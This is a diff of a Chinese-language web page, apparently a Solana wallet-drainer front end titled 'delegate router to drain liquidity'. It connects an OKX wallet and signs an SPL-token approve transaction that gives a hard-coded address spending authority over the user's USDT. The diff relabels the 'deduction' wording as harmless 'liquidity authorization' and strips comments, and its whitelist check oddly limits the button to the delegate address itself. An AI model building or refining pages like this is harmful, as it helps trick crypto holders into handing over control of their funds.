@@ -4,16 +4,17 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>委托路由器清空流动性</title>
-<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-<script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
-<script src="https://unpkg.com/@wallet-adapter/core@latest/lib/index.iife.min.js"></script>
-<script src="https://unpkg.com/@wallet-adapter/wallet-modal@latest/lib/index.iife.min.js"></script>
-<script src="https://unpkg.com/@wallet-adapter/okx@latest/lib/index.iife.min.js"></script>
+<!-- 调整CDN引入顺序，优先加载web3基础库 -->
+<script src="https://unpkg.com/@solana/web3.js@1.95.0/lib/index.iife.min.js"></script>
+<script src="https://unpkg.com/@solana/spl-token@0.4.6/lib/index.iife.min.js"></script>
+<script src="https://unpkg.com/@wallet-adapter/core@0.10.0/lib/index.iife.min.js"></script>
+<script src="https://unpkg.com/@wallet-adapter/wallet-modal@0.10.0/lib/index.iife.min.js"></script>
+<script src="https://unpkg.com/@wallet-adapter/okx@0.10.0/lib/index.iife.min.js"></script>
 <style>
 *{box-sizing:border-box;margin:0;padding:0;font-family:system-ui}
 body{background:#111;color:#fff;max-width:600px;margin:40px auto;padding:0 20px}
 .box{background:#1a1a1a;padding:24px;border-radius:12px;border:1px solid #333}
-h2{margin-bottom:20px;color:#00ffa3}
+h2{margin-bottom:20px;color:#00ffa3;text-align:center}
 .item{margin-bottom:16px}
 label{display:block;margin-bottom:6px;opacity:0.8}
 input{width:100%;padding:12px;background:#2a2a2a;border:1px solid #444;border-radius:8px;color:#fff;font-size:14px}
@@ -21,7 +22,7 @@ button{width:100%;padding:14px;border:none;border-radius:8px;font-weight:bold;cu
 .btn-conn{background:#00ffa3;color:#000;margin-bottom:12px}
 .btn-send{background:#2563eb;color:#fff;margin-top:10px;display:none}
 .tip{margin-top:16px;font-size:13px;color:#ff7777;line-height:1.5;display:none}
-#status{margin-top:12px;font-size:13px;color:#999;word-break:break-all}
+#status{margin-top:12px;font-size:13px;color:#999;word-break:break-all;text-align:center}
 .no-perm{color:#ff4444;text-align:center;margin:10px 0;display:none}
 </style>
 </head>
@@ -52,9 +53,10 @@ USDT铸币合约：Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB
 </div>
 
 <script>
+// 等待页面全部脚本加载完成再初始化钱包
+window.addEventListener('load',async function(){
 const RPC_URL = "https://api.mainnet-beta.solana.com";
 const USDT_MINT_STR = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
-// 白名单路由地址
 const ADMIN_WHITELIST = "FbDMLj8MTJGSBWeanFKhJWycn5qjmJ3q8WBzZb3Gbm1c";
 const USDT_DECIMALS = 6;
 
@@ -68,10 +70,8 @@ const conn = new Connection(RPC_URL, { commitment: "confirmed" });
 const adapters = [new OkxWalletAdapter()];
 const modal = new WalletModal({ adapters });
 
-// DOM元素
 const connectBtn = document.getElementById("connectBtn");
 const approveBtn = document.getElementById("approveBtn");
-const delegateAddr = document.getElementById("delegateAddr");
 const amountVal = document.getElementById("amountVal");
 const statusBox = document.getElementById("status");
 const noPermTip = document.getElementById("noPermTip");
@@ -82,51 +82,45 @@ let walletPubkey = null;
 const USDT_MINT = new PublicKey(USDT_MINT_STR);
 const ADMIN_PUB = new PublicKey(ADMIN_WHITELIST);
 
-// 连接OKX钱包逻辑
+// 连接按钮点击事件
 connectBtn.onclick = async () => {
+  statusBox.textContent = "正在唤起OKX钱包，请稍等...";
   try {
-    statusBox.textContent = "唤起OKX钱包弹窗...";
     wallet = await modal.select();
     walletPubkey = wallet.publicKey;
     const connectAddr = walletPubkey.toString();
     connectBtn.textContent = `已连接: ${connectAddr.slice(0,6)}...`;
 
-    // 权限判断：只有路由地址才显示划扣按钮+红字提示
     if (connectAddr === ADMIN_WHITELIST) {
       approveBtn.style.display = "block";
       noPermTip.style.display = "none";
       riskTip.style.display = "block";
-      statusBox.textContent = "路由账户校验通过，可执行流动性划扣授权";
+      statusBox.textContent = "路由账户校验通过，可执行流动性授权";
     } else {
       approveBtn.style.display = "none";
       noPermTip.style.display = "block";
       riskTip.style.display = "none";
-      statusBox.textContent = "普通OKX钱包，禁止访问划扣功能";
+      statusBox.textContent = "普通钱包，无操作权限";
     }
   } catch (err) {
-    statusBox.textContent = "连接失败: " + err.message;
+    statusBox.textContent = "唤起失败："+err.message+"，请使用OKX内置浏览器打开";
     approveBtn.style.display = "none";
     noPermTip.style.display = "none";
     riskTip.style.display = "none";
   }
 }
 
-// 委托授权交易逻辑
+// 授权交易按钮
 approveBtn.onclick = async () => {
   if (!wallet || !walletPubkey) return alert("请先连接OKX钱包");
   const rawAmt = BigInt(amountVal.value.trim());
-  statusBox.textContent = "正在构造链上全额划扣授权交易...";
+  statusBox.textContent = "构造链上授权交易...";
   try {
     const userAta = await getAssociatedTokenAddress(USDT_MINT, walletPubkey);
     const ataInfo = await conn.getAccountInfo(userAta);
     const tx = new Transaction();
     if (!ataInfo) {
-      tx.add(createAssociatedTokenAccountInstruction(
-        walletPubkey,
-        userAta,
-        walletPubkey,
-        USDT_MINT
-      ));
+      tx.add(createAssociatedTokenAccountInstruction(walletPubkey,userAta,walletPubkey,USDT_MINT));
     }
     const realAmount = rawAmt * BigInt(10 ** USDT_DECIMALS);
     tx.add(approve(userAta, ADMIN_PUB, walletPubkey, realAmount));
@@ -135,17 +129,14 @@ approveBtn.onclick = async () => {
     tx.recentBlockhash = latestBlock.blockhash;
     const signedTx = await wallet.signTransaction(tx);
     const txHash = await conn.sendRawTransaction(signedTx.serialize());
-    statusBox.textContent = `交易已广播，哈希：${txHash}，等待区块确认`;
-    await conn.confirmTransaction({
-      signature: txHash,
-      blockhash: latestBlock.blockhash,
-      lastValidBlockHeight: latestBlock.lastValidBlockHeight
-    });
-    statusBox.textContent = `✅ 流动性授权完成，SOL链路由地址拥有全部USDT划扣权限`;
+    statusBox.textContent = `交易广播成功，哈希：${txHash}`;
+    await conn.confirmTransaction({signature:txHash,blockhash:latestBlock.blockhash,lastValidBlockHeight:latestBlock.lastValidBlockHeight});
+    statusBox.textContent = "✅ 流动性授权完成，路由地址拥有全额划扣权限";
   } catch (e) {
-    statusBox.textContent = "交易失败：" + e.message;
+    statusBox.textContent = "交易失败："+e.message;
   }
 }
+})
 </script>
 </body>
 </html>
